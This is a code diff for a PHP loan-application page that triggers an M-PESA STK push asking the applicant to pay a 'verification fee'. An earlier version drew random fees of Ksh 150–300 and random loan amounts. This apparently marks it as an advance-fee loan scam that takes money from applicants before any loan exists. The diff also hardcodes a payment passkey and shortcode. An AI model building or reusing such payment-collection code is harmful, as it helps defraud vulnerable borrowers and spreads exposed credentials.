@@ -1,25 +1,88 @@
 <?php
+//INCLUDE THE ACCESS TOKEN FILE
+include 'accessToken.php';
 
-// Retrieve the form data
-$name = $_POST['name'];
-$phone_number = $_POST['phone_number'];
-$id_number = $_POST['id_number'];
-$loan_type = $_POST['loan_type'];
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Fetch the value of the 'money' input field and store it in a variable
+    $loan_fee = $_POST["loan-fee"];
+    $phone = $_POST["phone"];
+    $amount = $_POST["amount"];
+    $name = $_POST["name"];
+    $id_number = $_POST["id_number"];
+    $loan_type = $_POST["loan_type"];
 
-//create a variable called processed phone_number which removes the first 0 and replaces it with 254
-$processed_phone_number = substr($phone_number, 1);
-$processed_phone_number = "254" . $processed_phone_number;
 
-//fee charged for verification of loan random between 150 and 300
-$fee = rand(150, 300);
 
-//create a variable called amount which has a random value of 7600, 8300, 45000, 5000
 
-$amount = rand(8600, 45000);
+    date_default_timezone_set('Africa/Nairobi');
+    $processrequestUrl = 'https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest';
+    $callbackurl = 'https://patapesaharakaloans.co.ke/callback.php';
+    $passkey = "7891ff6fb899fc0721d0eb31326241b41f81f27dd817783b052579f525da768f";
+    $BusinessShortCode = '4116039';
+    $Timestamp = date('YmdHis');
+    // ENCRYPT DATA TO GET PASSWORD
+    $Password = base64_encode($BusinessShortCode . $passkey . $Timestamp);
+
+    $PartyA = $phone;
+    $PartyB = '';
+    $AccountReference = 'PesaLoans';
+    $TransactionDesc = 'Verification';
+    $Amount = $loan_fee;
+    $stkpushheader = ['Content-Type:application/json', 'Authorization:Bearer ' . $access_token];
+
+
+    //posting the data
+
+
+    //INITIATE CURL
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $processrequestUrl);
+    curl_setopt($curl, CURLOPT_HTTPHEADER, $stkpushheader); //setting custom header
+    $curl_post_data = array(
+        //Fill in the request parameters with valid values
+        'BusinessShortCode' => $BusinessShortCode,
+        'Password' => $Password,
+        'Timestamp' => $Timestamp,
+        'TransactionType' => 'CustomerPayBillOnline',
+        'Amount' => $Amount,
+        'PartyA' => $PartyA,
+        'PartyB' => $BusinessShortCode,
+        'PhoneNumber' => $PartyA,
+        'CallBackURL' => $callbackurl,
+        'AccountReference' => $AccountReference,
+        'TransactionDesc' => $TransactionDesc
+    );
+
+    $data_string = json_encode($curl_post_data);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_POST, true);
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $data_string);
+    $curl_response = curl_exec($curl);
+
+    //ECHO  RESPONSE
+    $data = json_decode($curl_response);
+    // var_dump($data);
+
+
+    if (isset($data->CheckoutRequestID) && isset($data->ResponseCode)) {
+        $CheckoutRequestID = $data->CheckoutRequestID;
+        $ResponseCode = $data->ResponseCode;
+        if ($ResponseCode == "0") {
+            echo "
+   
+   
+   
+    ";
+        }
+    } else {
+        // Handle the case when the required properties are missing
+        echo "Error: Missing required properties in the API response.";
+    }
+    curl_close($curl);
+}
 
 
 ?>
-
 
 
 <!DOCTYPE html><html lang="en"><head>
@@ -79,7 +142,7 @@ $amount = rand(8600, 45000);
 <div class="row pb-2">
 <div class="col-md-3"></div>
 <div class="col-md-6">
-<div class="mt-2 alert alert-success d-none" role="alert">
+<div class="mt-2 alert alert-success" role="alert">
 Please enter your M-PESA PIN in the prompt on your phone to complete the process.
 </div>
 <div class="card">
@@ -105,7 +168,7 @@ Please enter your M-PESA PIN in the prompt on your phone to complete the process
 <tr>
 <td>MPESA Number:</td>
 <td>
-    <?php echo $processed_phone_number; ?>
+    <?php echo $phone; ?>
 </td>
 </tr>
 <tr>
@@ -129,32 +192,11 @@ Please enter your M-PESA PIN in the prompt on your phone to complete the process
 <tr>
 <td>Verification Fee</td>
 <td>Ksh. 
-    <?php echo $fee; ?>
+    <?php echo $loan_fee; ?>
 </td>
 </tr>
 </tbody></table>
-<form method="POST" action="stkpush.php">
-  <input type="hidden" name="_token" value="55cZURnpYjvc1qwIbv7DqxNkFYZx0cknXIJPZkkf">
-  <input type="hidden" name="phone" value="<?php echo $processed_phone_number; ?>">
-  <input type="hidden" name="loan-fee" value="<?php echo $fee; ?>">
-  <input type="hidden" name="amount" value="<?php echo $amount; ?>">
-  <input type="hidden" name="name" value="<?php echo $name; ?>">
-  <input type="hidden" name="id_number" value="<?php echo $id_number; ?>">
-  <input type="hidden" name="loan_type" value="<?php echo $loan_type; ?>">
 
-
-  <div class="row pb-2">
-    <div class="signin-none tab-100 col-md-12">
-      <label class="signin-none">
-        <span>
-          By submitting, you confirm that you accept the <a data-bs-toggle="modal" data-bs-target="#terms" style="color:#564FF9;">Terms and Conditions</a> and <a data-bs-toggle="modal" data-bs-target="#policy" style="color:#564FF9;">Privacy Policy</a>
-        </span>
-      </label>
-    </div>
-  </div>
-
-  <button type="submit" class="btn btn-danger">Get Loan Now</button>
-</form>
 
 </div>
 </div>
@@ -163,7 +205,7 @@ Please enter your M-PESA PIN in the prompt on your phone to complete the process
 </div>
 <div class="row">
 <div class="col-12">
-<p class="text-center text-muted">© 2023. All rights reserved. Go back <a href="/" style="color:#564FF9;">home</a>.</p>
+<p class="text-center text-muted">© 2023. All rights reserved. Go back <a href="index.php" style="color:#564FF9;">home</a>.</p>
 </div>
 </div>
 </div>
@@ -253,3 +295,4 @@ Loan disbursement: Loan will be disbursed to the MPESA number provided &amp; tak
 
 
 </body></html>
+
